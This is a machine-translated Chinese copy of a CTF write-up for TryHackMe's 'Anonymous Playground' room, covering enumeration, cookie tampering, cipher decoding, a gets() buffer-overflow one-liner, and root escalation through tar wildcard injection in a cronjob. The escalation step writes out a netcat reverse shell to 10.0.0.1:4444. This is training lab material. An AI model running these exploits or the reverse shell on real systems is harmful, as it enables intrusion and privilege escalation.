<html>
<head>
<title>TryHackMe: Anonymous Playground CTF Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe:匿名游乐场CTF报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-anonymous-playground-ctf-writeup-5d7b28153d1f?source=collection_archive---------0-----------------------#2020-08-19">https://infosecwriteups.com/tryhackme-anonymous-playground-ctf-writeup-5d7b28153d1f?source=collection_archive---------0-----------------------#2020-08-19</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="b8d3" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在这篇文章中，我将展示我完成<strong class="js iu">匿名游乐场</strong>捕捉旗帜(CTF)的方法，这是一个由<em class="ko">匿名创建的TryHackMe平台上的免费房间。</em>我在下面的参考资料中提供了TryHackMe平台的链接，供有兴趣试用这款CTF的人参考。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi kp"><img src="../Images/c65a5ff0f101b843e2e4077f63bf81b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1302/format:webp/1*knjOki3UQwsGVY8vOvRZqA.png"/></div></figure></div><div class="ab cl kx ky hx kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="im in io ip iq"><h1 id="b9c3" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">放弃</h1><p id="cb9a" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">我喜欢在一篇文章之前添加一个简短的免责声明，以鼓励人们在阅读这篇文章之前尝试一下这个房间，因为在这篇文章中显然会有<strong class="js iu">剧透</strong><strong class="js iu"/>。我相信，如果你先自己尝试一下，然后在遇到困难或需要提示时再来写这篇文章，你会更喜欢CTF。因此，没有任何进一步的拖延，让我们开始吧！</p></div><div class="ab cl kx ky hx kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="im in io ip iq"><h1 id="23e2" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">CTF背景——加入匿名</h1><p id="7304" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">CTF作者提供了以下背景:</p><blockquote class="mh mi mj"><p id="b33a" class="jq jr ko js b jt ju jv jw jx jy jz ka mk kc kd ke ml kg kh ki mm kk kl km kn im bi translated">所以，你已经决定和匿名者签约了？嗯，没那么容易。他们为你建造了一个脆弱的CTF机器，让你侵入并证明你有资格成为“匿名者”的一员。你能做到吗？你有这种能力吗？</p><p id="255e" class="jq jr ko js b jt ju jv jw jx jy jz ka mk kc kd ke ml kg kh ki mm kk kl km kn im bi translated">这台机器上有<strong class="js iu"> 3个标志</strong>。<strong class="js iu">两个</strong>将成为<strong class="js iu">用户</strong>，另一个用户将成为<strong class="js iu">超级用户</strong>。</p></blockquote></div><div class="ab cl kx ky hx kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="im in io ip iq"><h1 id="bb7a" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">列举</h1><p id="cdad" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">首先，我使用NMAP工具扫描目标机器，查找任何开放的端口和运行在这些端口上的服务。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/fc375a3e9b42d6fa2136a8d29efc0725.png" data-original-src="https://miro.medium.com/v2/resize:fit:1052/format:webp/1*YSChuXh_BLDmU2iHFaw28w.png"/></div></figure><p id="ea18" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">NMAP命令可以细分如下:</p><ul class=""><li id="0968" class="mo mp it js b jt ju jx jy kb mq kf mr kj ms kn mt mu mv mw bi translated"><strong class="js iu"> -Pn </strong>:禁用主机发现。</li><li id="ff42" class="mo mp it js b jt mx jx my kb mz kf na kj nb kn mt mu mv mw bi translated"><strong class="js iu"> -sV </strong>:对服务进行版本检测。</li><li id="e7de" class="mo mp it js b jt mx jx my kb mz kf na kj nb kn mt mu mv mw bi translated"><strong class="js iu"> -sC </strong>:使用NMAP提供的默认脚本执行脚本扫描。</li><li id="21cf" class="mo mp it js b jt mx jx my kb mz kf na kj nb kn mt mu mv mw bi translated"><strong class="js iu"> -v </strong>:提供关于NMAP扫描的详细信息。</li><li id="64f0" class="mo mp it js b jt mx jx my kb mz kf na kj nb kn mt mu mv mw bi translated"><strong class="js iu"> -oN </strong>:将扫描结果输出到文件。</li></ul><p id="25ed" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">扫描发现了两个开放的端口，端口80和端口22。我决定检查托管在80端口的网站。我找到了一个<strong class="js iu">首页</strong>和一个叫<strong class="js iu">老江湖</strong>的页面。查看<strong class="js iu">操作人员页面</strong>，我可以看到一个似乎是用户名的列表。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/191a5a30221b6bfa3ac60d233836c808.png" data-original-src="https://miro.medium.com/v2/resize:fit:522/format:webp/1*WmsZyyfs-JEWWDY0qWCiSg.png"/></div></figure><p id="81f8" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我还在主页和操作页面的页面源代码中发现了一条注释，其中包含了另一个名为<strong class="js iu">upcoming.php的页面的名称。</strong></p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/931c12c3ee1148afd34814b9d2b4ec2c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1226/format:webp/1*Www7pbYnE9Iu5my8P786_w.png"/></div></figure><p id="db99" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">然而，当我试图访问此页面时，我收到了一个<strong class="js iu">未找到错误</strong>。NMAP扫描还在<strong class="js iu"> robots.txt </strong>文件中发现了一个条目。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/a7c1d13766121d932b1dda993c8cdb13.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*XC4L053iauLr3NPM1a7BsA.png"/></div></figure><p id="d9b9" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">当试图访问这个条目时，我看到一个新页面，通知我没有被授予访问权限。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/bf65d87384e61c8c39c505b4a1e921df.png" data-original-src="https://miro.medium.com/v2/resize:fit:588/format:webp/1*Cm7Ee9B3hva9VVTPvdMyog.png"/></div></figure><p id="4f79" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">使用chrome中的开发者工具，我能够找到一个名为<strong class="js iu">访问</strong>的<strong class="js iu"> cookie </strong>，它的值被设置为<strong class="js iu">拒绝</strong>。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/1cc31de0e2b233ec37867cea9e4ea414.png" data-original-src="https://miro.medium.com/v2/resize:fit:522/format:webp/1*JE6DNFEbvVgJJRnPtaPwSw.png"/></div></figure><p id="996e" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我将这个值改为<strong class="js iu"> granted </strong>，然后重新加载页面。这很有效，我在网页上看到了一条新消息。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/7fae2a9e140c10737bc650206ca7f22f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/format:webp/1*VrlWsNTJE32z-Zdb3Mzrhg.png"/></div></figure></div><div class="ab cl kx ky hx kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="im in io ip iq"><h1 id="e1d1" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">破译密码</h1><p id="6f7c" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">页面上似乎有某种编码的消息，看起来像可能的凭证(即<strong class="js iu">用户名::密码</strong>)。在花了一些时间试图破译信息后，我决定看看CTF作者提供的提示，可以在下面看到。</p><blockquote class="mh mi mj"><p id="24b0" class="jq jr ko js b jt ju jv jw jx jy jz ka mk kc kd ke ml kg kh ki mm kk kl km kn im bi translated"><strong class="js iu">提示</strong>:你会想要为此写一个Python脚本。zA = ' a '</p></blockquote><p id="89b7" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">根据提示，“zA”等于“a”。经过一番挠头之后，我意识到，如果你将字母改变到它们在<strong class="js iu">字母表</strong>中的<strong class="js iu">有序数字位置</strong>，并将它们加在一起，那么你将得到一个新值，它将代表字母表中另一个字母的有序数字位置。下面的例子说明了这一点。</p><pre class="kq kr ks kt gt nh ni nj nk aw nl bi"><span id="de9f" class="nm lf it ni b gy nn no l np nq"><strong class="ni iu">#</strong> <strong class="ni iu">EXAMPLE 1</strong><br/>'z' = 26 # 26th letter in the alphabet<br/>'A' = 1 # 1st letter in the alphabet</span><span id="4bfa" class="nm lf it ni b gy nr no l np nq">(26 + 1) % 26 = 1 = 'a'</span><span id="465a" class="nm lf it ni b gy nr no l np nq"><strong class="ni iu"># EXAMPLE 2</strong><br/>'h' = 8<br/>'E' = 5</span><span id="b0bf" class="nm lf it ni b gy nr no l np nq">(8 + 5) % 26 = 13 = 'm'</span><span id="e847" class="nm lf it ni b gy nr no l np nq">N.B. Mod (i.e. '<strong class="ni iu">%</strong>') 26 is used since there are only 26 letters in the alphabet.</span></pre><p id="b1f9" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">手动执行这些计算是可能的，但是我决定在一些在线资源的帮助下编写一个简单的python脚本来完成它。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi ns"><img src="../Images/f161ec7fe26f04f8ddbd5a19f00f704a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6M9nPkoBmwHJ8YsZP8DaXw.png"/></div></div></figure><p id="8bba" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">运行这个脚本给我一个用户名和密码。如果我查看之前在检查网站时看到的<strong class="js iu">操作人员</strong>的列表，我也可以看到用户名出现在列表中。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/ba0772a8020716c86e518677f14e4fef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1030/format:webp/1*HtcTr8OrzfnDzWdzXU85yw.png"/></div></figure><p id="91c3" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">使用这些凭证，我可以SSH到目标机器并检索第一个用户标志。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/df45b0ef01303e7eec63c73e62e64b56.png" data-original-src="https://miro.medium.com/v2/resize:fit:988/format:webp/1*EEAU_fOBrdjZasrTdr4NpQ.png"/></div></figure></div><div class="ab cl kx ky hx kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="im in io ip iq"><h1 id="fbc8" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">用户权限提升</h1><p id="b193" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">我在magna用户的主目录中找到了一个名为“<strong class="js iu"> hacktheworld </strong>”的二进制可执行文件和一个名为“<strong class="js iu">note _ from _ ghost . txt</strong>”的文本文件。该文本文件包含下图所示的消息。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi nz"><img src="../Images/a113131536f06fadfcfbc9aa2e2607d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_Hpwu3uuP5-wmUnWgA_vEw.png"/></div></div></figure><p id="d08f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我决定使用<strong class="js iu"> scp </strong>将文件复制到我的本地机器上，以便进一步分析。</p><pre class="kq kr ks kt gt nh ni nj nk aw nl bi"><span id="d3d3" class="nm lf it ni b gy nn no l np nq">scp magna@10.10.77.16:/home/magna/hacktheworld . </span></pre><p id="86b2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">使用<strong class="js iu"> Ghidra </strong>，我通过查看它的<strong class="js iu">主</strong>函数开始检查二进制文件。该代码创建一个64字节大小的char缓冲区。然后，程序使用函数“<strong class="js iu"> gets() </strong>”接受我的输入。这个易受攻击的C函数可被利用来导致<strong class="js iu">缓冲区溢出</strong>。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/17015f9d56412a89ecb6a5afef86b26c.png" data-original-src="https://miro.medium.com/v2/resize:fit:590/format:webp/1*L_0baztpbPZdn4sfm-Pljg.png"/></div></figure><p id="d761" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我发现第二个函数叫做“<strong class="js iu"> call_bash </strong>”，在<strong class="js iu"> main </strong>函数中没有引用。该函数在使用函数“<strong class="js iu"> setuid() </strong>”设置调用进程的有效用户id之前打印几条消息。然后在设置的用户ID下创建一个新的shell。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/fe6046794bc86e3d48661f3d9b77041c.png" data-original-src="https://miro.medium.com/v2/resize:fit:692/format:webp/1*OEFdEgm7y0wb1fr81CVTTQ.png"/></div></figure><p id="9829" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我可以利用易受攻击的C函数"<strong class="js iu"> gets() </strong>"造成<strong class="js iu">缓冲区溢出</strong>，并用"<strong class="js iu"> call_bash </strong>"函数的地址覆盖堆栈上的返回地址。为了找到缓冲区的大小以及需要多少个“A”来覆盖它，我使用python来提供输入，并确定导致程序崩溃的“A”的确切数量。这涉及到一些尝试和错误。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi oc"><img src="../Images/a19be9bc5475dda74f696a07a75e55d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cfUVAG6GzoEUCTEj-2rHCw.png"/></div></div></figure><p id="7ed3" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我发现提供<strong class="js iu"> 72 "A" </strong>会导致<strong class="js iu">分段错误</strong>的发生，任何不足都不会导致程序崩溃。接下来，我用“<strong class="js iu"> readelf </strong>”和“<strong class="js iu"> grep </strong>”找到了“<strong class="js iu"> call_bash </strong>”函数的内存地址。</p><pre class="kq kr ks kt gt nh ni nj nk aw nl bi"><span id="80bd" class="nm lf it ni b gy nn no l np nq">readelf -s hacktheworld | grep -i "call_bash"</span></pre><p id="deaf" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这为函数"<strong class="js iu"> call_bash </strong>"提供了如下地址。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi od"><img src="../Images/8fdc5d8006fa8d0b2c7ea76b523f7e65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FSElXReqopoo3dC8JntVjA.png"/></div></div></figure><p id="ca35" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我现在可以将这个内存地址以十六进制格式<strong class="js iu">附加到我的<strong class="js iu">72“A”</strong>的末尾，同时<strong class="js iu"> </strong>仍然保持写在内存中的函数的<strong class="js iu">字符顺序</strong>。</strong></p><pre class="kq kr ks kt gt nh ni nj nk aw nl bi"><span id="5422" class="nm lf it ni b gy nn no l np nq">python -c 'print "A"*72 + \x58\x06\x40\x00\x00\x00\x00\x00"' | ./hacketheworld</span></pre><p id="e22f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这成功地调用了函数，但是我没有得到预期的升级的shell。相反，我得到一个分段错误。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/a5c8ef07d616a69cb19df92069780835.png" data-original-src="https://miro.medium.com/v2/resize:fit:768/format:webp/1*ey6V0shqRpPBBNDeMxj0aQ.png"/></div></figure><p id="7371" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在花了一些时间试图找出为什么我不能让漏洞工作之后，我看到了LiveOverflow提供的解释。当我利用程序创建一个shell时，shell被执行，但是没有任何输入，所以shell最终只是退出。为了解决这个问题，我可以将我的漏洞利用与命令<strong class="js iu"> cat </strong>结合起来，如下所示。</p><pre class="kq kr ks kt gt nh ni nj nk aw nl bi"><span id="1ed6" class="nm lf it ni b gy nn no l np nq">(python -c 'print "A"*72 + \x58\x06\x40\x00\x00\x00\x00\x00"' ; cat) | ./hacketheworld</span></pre><p id="617b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这很有效，我已经成功地将我的权限升级到了用户<strong class="js iu">幽灵</strong>。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi of"><img src="../Images/8f102aa6fa04caa98ad9dfeb23e36e44.png" data-original-src="https://miro.medium.com/v2/resize:fit:762/format:webp/1*iGfi0RRa4gtQiNLGzpARVg.png"/></div></figure><p id="86a2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我使用python来导入<strong class="js iu"> pty </strong>模块，并创建一个完全交互式的TTY外壳，如下所示。</p><pre class="kq kr ks kt gt nh ni nj nk aw nl bi"><span id="e0ec" class="nm lf it ni b gy nn no l np nq">python -c 'import pty; pty.spawn("/bin/sh")'</span></pre><p id="caca" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在这之后，我导航到用户ghost的主目录并获得第二个用户标志。</p></div><div class="ab cl kx ky hx kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="im in io ip iq"><h1 id="2dca" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated"><strong class="ak">根权限提升</strong></h1><p id="5078" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">现在我已经有了两个用户标志，我开始寻找任何方法将我的权限提升到root。在寻找特权提升漏洞时，我决定检查是否有任何有趣的<strong class="js iu"> cronjobs </strong>正在运行。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi og"><img src="../Images/e5a0e0fe07bedf7cc8b4de6b5beb7cd8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XK15UZybPsuWhc8QfMbpgw.png"/></div></div></figure><p id="e634" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我看到一个有趣的<strong class="js iu"> cronjob </strong>正在由用户<strong class="js iu"> root </strong>运行。这个cronjob执行一系列命令，将用户ghost的主目录中的所有文件归档到一个<strong class="js iu"> tar </strong>文件中。在搜索了使用tar文件提升权限的方法之后，我看到了一篇名为“<em class="ko">利用通配符提升权限</em>”的文章。在本文中，我发现了如何通过输入以下命令使用<strong class="js iu"> Tar通配符注入</strong>来提升我的权限。</p><pre class="kq kr ks kt gt nh ni nj nk aw nl bi"><span id="fa10" class="nm lf it ni b gy nn no l np nq">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4444 &gt;/tmp/f" &gt; shell.sh</span><span id="8365" class="nm lf it ni b gy nr no l np nq">echo "" &gt; "--checkpoint-action=exec=sh shell.sh"</span><span id="f645" class="nm lf it ni b gy nr no l np nq">echo "" &gt; --checkpoint=1</span></pre><p id="d125" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这些命令的工作方式如下:</p><ul class=""><li id="3e6c" class="mo mp it js b jt ju jx jy kb mq kf mr kj ms kn mt mu mv mw bi translated">创建一个反向shell，并将其存储在一个名为<strong class="js iu"> shell.sh </strong>的文件中。</li><li id="178f" class="mo mp it js b jt mx jx my kb mz kf na kj nb kn mt mu mv mw bi translated"><strong class="js iu">–检查点[=数字] </strong>显示每个数字记录的进度消息(默认为10)。</li><li id="6172" class="mo mp it js b jt mx jx my kb mz kf na kj nb kn mt mu mv mw bi translated"><strong class="js iu">–check point-ACTION = ACTION</strong>对每个检查点执行操作。在第一个文件归档后运行文件shell.sh。由于crontab的原因，tar命令以root用户身份运行，这会产生一个netcat shell，并将其发送到端口4444上的攻击平台。</li></ul><p id="b5bc" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">接下来，我在我的主机设备上为端口4444上的任何传入连接设置一个netcat监听器。</p><pre class="kq kr ks kt gt nh ni nj nk aw nl bi"><span id="5f78" class="nm lf it ni b gy nn no l np nq">nc -lvnp 4444</span></pre><p id="328d" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">几分钟后，我得到一个具有root权限的反向shell。然后，我可以切换到根目录，并获得最终的根用户标志😄！</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/b63c17798f7a5c5fe83e21391c3405ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1318/format:webp/1*SM2Gx4_bTAOZUWI87bi1gg.png"/></div></figure></div><div class="ab cl kx ky hx kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="im in io ip iq"><h1 id="f5c2" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">结束语</h1><p id="26d8" class="pw-post-body-paragraph jq jr it js b jt mc jv jw jx md jz ka kb me kd ke kf mf kh ki kj mg kl km kn im bi translated">这是TryHackMe平台上提供的一个有趣且具有挑战性的CTF。我在TryHackMe平台上玩得很开心，这是一个学习新技能和玩CTF游戏的好地方。感谢阅读到最后，继续黑客！</p></div><div class="ab cl kx ky hx kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="im in io ip iq"><h1 id="9457" class="le lf it bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">参考</h1><ul class=""><li id="21d3" class="mo mp it js b jt mc jx md kb oi kf oj kj ok kn mt mu mv mw bi translated"><a class="ae ol" href="https://www.youtube.com/watch?v=HSlhY4Uy8SA" rel="noopener ugc nofollow" target="_blank">https://www.youtube.com/watch?v=HSlhY4Uy8SA</a></li><li id="d8ce" class="mo mp it js b jt mx jx my kb mz kf na kj nb kn mt mu mv mw bi translated"><a class="ae ol" href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">https://www . hacking articles . in/exploining-wild card-for-privilege-escalation/</a></li><li id="c6e7" class="mo mp it js b jt mx jx my kb mz kf na kj nb kn mt mu mv mw bi translated"><a class="ae ol" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank">http://pentest monkey . net/cheat-sheet/shell/reverse-shell-cheat-sheet</a></li></ul></div></div>    
</body>
</html>